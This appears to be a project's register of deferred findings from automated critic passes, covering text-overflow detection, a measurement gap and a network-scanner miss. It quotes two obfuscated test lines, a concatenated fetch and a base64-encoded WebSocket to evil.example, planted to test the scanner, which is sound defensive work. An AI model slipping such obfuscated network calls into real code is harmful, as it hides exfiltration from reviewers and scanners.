# DEFERRED

Per §21.4: severity-2 findings are fixed unless a written rationale is filed
here. Severity-1 findings are never deferred — they block emit and there is no
override flag.

This file is the register that makes a deferral a deliberate, reviewable act
rather than an omission. A finding that is absent from both the fix log and this
file has been forgotten, not decided.

---

## Critic passes run

| Pass | Report | Axes | Findings | Disposition |
|---|---|---|---|---|
| 1 | `CRITIQUE-1.md` | 6 pass, 5 fail | 7 sev-1, 10 sev-2, 7 sev-3 | **All 24 fixed.** Nothing deferred |
| 2 | `CRITIQUE-2.md` | 9 pass, 2 fail | 1 sev-1, 7 sev-2, 8 sev-3 | **All 16 closed.** Two deferrals below |

§21's exit condition is the critic clean on all eleven axes **twice
consecutively**, the second pass against a freshly emitted artifact. Neither
condition is met yet: pass 2 failed axes 5 and 9, and no pass has come back
clean.

The two axes that failed are the two the fixes were aimed at, and both now have
a number rather than an assertion. Axis 5, overflow detection efficacy: §17.4
asks for recall ≥ 0.98 and pass 2 measured 0.65. It is now **0.9921** per box
and per finding, measured in Chromium against the emitted corpus artifact, with
precision 1.0000. Axis 9, degradation honesty: the reported saving now equals
the actual saving at every budget tested, where it was out by exactly 2×.

---

## Deferred from CRITIQUE-2

### C16 · The network scanner does not see a base64-obfuscated API name

*Severity 3. Deferred pending L10's judgment, which is the correct owner.*

26 of the critic's 27 planted network references were caught, including
`window["fe"+"tch"]("htt"+"ps://evil.example/x")`. The miss:

```js
new (window[atob("V2ViU29ja2V0")])(atob("d3NzOi8vZXZpbC5leGFtcGxlL3M="))
```

No token and no URL, so there is nothing for `JS_NETWORK_TOKENS` to match.

**The critic could not find a product path to it and said so.** Planted as a
`raw` `ContentBlock` — which is how a prospect's own obfuscated analytics would
actually arrive — the whole `<script>` is flattened to text by
`src/scene/blocks.js` before the scanner runs, and the base64 payload is absent
from the emitted file. It is a hardening note about a lane API, not a live hole.

The reason this is deferred rather than fixed is that the fix has a real cost and
the threat does not: a base64-decode pass over inline script fires on every
legitimate `atob`, and §1.1's law is enforced by *this* scanner, so a rule that
cries wolf degrades the defence that is working. L10 has been asked to decide and
to record the answer either way. **"We looked at this and chose not to, because
—" is the outcome being sought**, not a fix by default.

### C1's residual · one box out of 126, and it is a measurement limit

*Not a deferral of the finding — the axis it belongs to now passes. Recorded
because the residual is real and someone should not have to re-derive it.*

L11's browser-measured recall over the emitted corpus artifact leaves one box
Chromium cuts that the model does not report:

```
"exchanger — Northwind Industrial"
  Chromium  351.13px      engine  348.70px      container  350px
```

0.69% apart, with the container edge falling between them, so Chromium wraps to
a third line and the model keeps two. That sits inside the residual disagreement
`overflow-browser.test.mjs` already measures across the deck — mean 0.158%,
p95 0.890% — so it is a limit of `src/core/text-metrics.js`'s advance tables
against a real rasteriser, not a defect in the detector.

Closing it means either shipping per-glyph hinted metrics for every face, or
widening the noise band until the check stops catching real overflow. Neither is
worth 1 box in 126. **What is not acceptable is buying the number by widening
the band, and L11 and L8 each declined to do that explicitly.**

### `badgeNumber`'s height is unmeasurable

*Severity 3. Deferred to keep the tree quiet for the §20 critic's next pass.*

L11 found, while measuring recall, that `measureScene` gives the `badgeNumber`
role the `fanSource` slot's 536px height rather than the badge's own 40px box.
So no height check on that role can fire at all.

It costs nothing today: the badge is `overflow: visible`, the numeral stands
2–3px proud of its circle and nothing is lost — which is why ten of the eleven
boxes in the recall residual are badges that are not cut. But a role whose
height cannot be checked is a hole in a measurement the product depends on, and
it should be closed rather than left because it is currently harmless.

Deferred rather than dispatched only because it is L8's file and a §20 critic
pass is about to run: a critic measuring a tree that four lanes are editing
gets a result about no particular tree. It goes to L8 immediately after.

---

## Nothing else is deferred

Every other finding in both reports is either fixed or in flight with a named
owner. Where a lane disagreed with a finding, the disagreement is recorded in
`docs/disputes/L<n>-*.md` and indexed in `CONTRACTS-DISPUTES.md`, and the lane
built against the contract as written regardless — which is §4's rule, not a
deferral.
